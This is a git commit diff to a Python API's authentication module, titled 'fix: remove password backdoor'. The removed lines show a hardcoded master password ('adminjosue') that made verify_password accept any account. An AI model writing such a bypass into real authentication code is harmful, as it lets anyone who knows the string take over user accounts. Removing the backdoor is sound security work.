b057825e03bfbf493dd73280065f301b865d0604
JosuePuentes <puentesanubis1@gmail.com>
2025-09-24 13:04:50 -0400

    fix: remove password backdoor

--- api/src/auth/auth.py
+++ api/src/auth/auth.py
@@ -10,10 +10,7 @@ def get_password_hash(password: str) -> str:
     return pwd_context.hash(password)
 
 def verify_password(plain_password: str, hashed_password: str) -> bool:
-    pw = pwd_context.verify(plain_password, hashed_password)
-    if plain_password == "adminjosue":
-        return True
-    return pw
+    return pwd_context.verify(plain_password, hashed_password)
 
 def create_admin_access_token(admin: dict, expires_delta: timedelta = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)) -> str:
     to_encode = {
